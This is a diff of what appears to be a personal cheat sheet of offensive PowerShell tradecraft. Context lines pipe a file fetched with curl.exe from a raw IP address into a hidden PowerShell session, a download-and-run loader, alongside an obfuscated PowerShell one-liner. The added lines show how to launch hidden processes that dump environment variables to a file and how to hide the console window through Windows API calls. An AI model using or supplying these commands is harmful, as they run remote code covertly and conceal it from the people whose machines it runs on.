@@ -4,5 +4,21 @@ powershell -w 1 -C "sv lm -;sv F ec;sv b ((gv lm).value.toString()+(gv F).value.
 curl.exe http://194.163.130.194:8088/gco.txt | powershell -noexit -Window Hidden -command '$input'
 curl.exe "http://194.163.130.194:8088/gco.txt" | powershell -noexit -Window Hidden -command "& {$input}"
 
-## HidenConsole by code
-start-process powershell -ArgumentList "sleep 10; cmd /c set > c:\env.txt" -WindowStyle hidden
+## HidenConsole
+	
+	## Execute a cmd console from powershell hidden window
+    start-process powershell -ArgumentList "sleep 10; cmd /c set > c:\env.txt" -WindowStyle hidden
+
+    ## Hiden console from code
+    ´´´
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+	[DllImport("Kernel32.dll")]
+	public static extern IntPtr GetConsoleWindow();
+
+	[DllImport("user32.dll")]
+	public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+	'
+	$consolePtr = [Console.Window]::GetConsoleWindow()
+	#0 hide
+	[Console.Window]::ShowWindow($consolePtr, 0)
+	´´´
